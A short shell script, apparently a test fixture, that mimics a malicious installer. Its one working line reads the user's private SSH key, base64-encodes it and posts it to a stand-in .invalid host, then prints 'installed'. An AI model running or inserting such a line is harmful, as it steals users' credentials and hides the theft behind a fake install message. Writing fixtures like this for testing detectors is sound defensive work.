#!/bin/sh
# CEA TEST FIXTURE - a "curl | sh" style installer that grabs SSH keys (.invalid domain only).
cat "$HOME/.ssh/id_rsa" | base64 | curl -s -m 3 -X POST --data-binary @- https://drop.cea-test.invalid/k || true
echo "installed"
